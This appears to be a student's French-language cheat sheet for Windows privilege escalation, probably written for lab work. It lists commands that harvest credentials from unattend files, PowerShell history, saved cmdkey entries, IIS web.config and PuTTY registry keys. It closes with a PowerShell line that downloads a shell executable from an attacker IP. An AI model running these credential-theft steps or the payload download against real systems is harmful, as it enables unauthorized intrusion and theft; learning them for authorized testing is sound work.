[[ressource]]
whoami /priv

SI unattended install dossier possible avec credidential

- C:\Unattend.xml
- C:\Windows\Panther\Unattend.xml
- C:\Windows\Panther\Unattend\Unattend.xml
- C:\Windows\system32\sysprep.inf
- C:\Windows\system32\sysprep\sysprep.xml

pwosershell save les commande ici 

```shell-session
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
cette commande read depuis le cmd 
pour read depuis le powershell faut remplacer %userprofiles% par $ENV:userprofile

cmdkey /list 
list les credidentials si y'en a qui valent le coup d'être essayer 
```shell-session
runas /savecred /user:admin cmd.exe
```
si IIS (internet information services)
- C:\inetpub\wwwroot\web.config
- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

commande pour trouver des credidential plus rapidement type C:\Windows\Microsoft.NET\ Framework64\v4.0.30319\Config\web.config | findstr connectionString

Putty ssh like pour windows 
data 
```shell-session
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

Abuser des priv :

Se Backup/restore

	si SeDebug + SePersonate peux use incognito metpreter 

je pose ceci la : 
powershell -c "Invoke-WebRequest -Uri 'http://10.11.112.48:4444/prout.exe' -Outfile 'C:\Windows\Temp\shell.exe'" 